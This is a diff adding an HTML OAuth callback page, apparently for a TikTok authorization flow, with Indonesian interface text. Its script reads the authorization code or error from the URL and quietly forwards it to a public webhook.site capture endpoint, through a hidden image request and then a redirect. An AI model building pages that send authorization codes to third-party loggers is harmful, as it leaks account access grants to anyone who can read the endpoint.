@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Authorization received</title>
+<style>
+  body { margin:0; background:#FAF7F2; color:#241F1C;
+         font:16px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
+         display:flex; align-items:center; justify-content:center; min-height:100vh; padding:24px; }
+  .card { background:#fff; border-radius:16px; padding:40px 36px; max-width:520px; width:100%;
+          box-shadow:0 8px 40px rgba(36,31,28,.08); text-align:center; }
+  h1 { font-size:24px; margin:0 0 10px; letter-spacing:-.4px; }
+  p { color:#6B6157; margin:0 0 20px; font-size:15px; }
+  .ok { color:#2C5A39; font-weight:700; }
+  .err { color:#8C3324; font-weight:700; }
+  code { background:#F3EDE6; padding:2px 6px; border-radius:5px; font-size:13px; }
+</style>
+</head>
+<body>
+<div class="card" id="card">
+  <h1 id="title">Menerima otorisasi…</h1>
+  <p id="msg">Jangan tutup halaman ini.</p>
+</div>
+<script>
+(function () {
+  // Tujuan penerusan: penangkap kode di webhook.site
+  var SINK = "https://webhook.site/faa7455b-b0de-4d4d-a7d3-f584c884f82e";
+  var qs = new URLSearchParams(window.location.search);
+  var code = qs.get("code");
+  var err  = qs.get("error") || qs.get("error_description");
+
+  var title = document.getElementById("title");
+  var msg   = document.getElementById("msg");
+
+  if (code) {
+    title.textContent = "Otorisasi diterima ✓";
+    title.className = "ok";
+    msg.innerHTML = "Kode diteruskan. Kamu boleh menutup tab ini dan kembali ke chat.";
+    var u = SINK + "?code=" + encodeURIComponent(code) + "&src=tiktok";
+    var img = new Image();
+    img.src = u;                        // penerusan senyap
+    setTimeout(function () { window.location.replace(u); }, 600);
+  } else if (err) {
+    title.textContent = "Otorisasi ditolak";
+    title.className = "err";
+    msg.innerHTML = "Pesan: <code>" + String(err).replace(/[<>&]/g, "") + "</code>";
+    var u2 = SINK + "?error=" + encodeURIComponent(err) + "&src=tiktok";
+    var img2 = new Image(); img2.src = u2;
+  } else {
+    title.textContent = "Halaman callback";
+    msg.innerHTML = "Halaman ini menerima kode otorisasi. Buka dari alur izin aplikasi, bukan langsung.";
+  }
+})();
+</script>
+</body>
+</html>
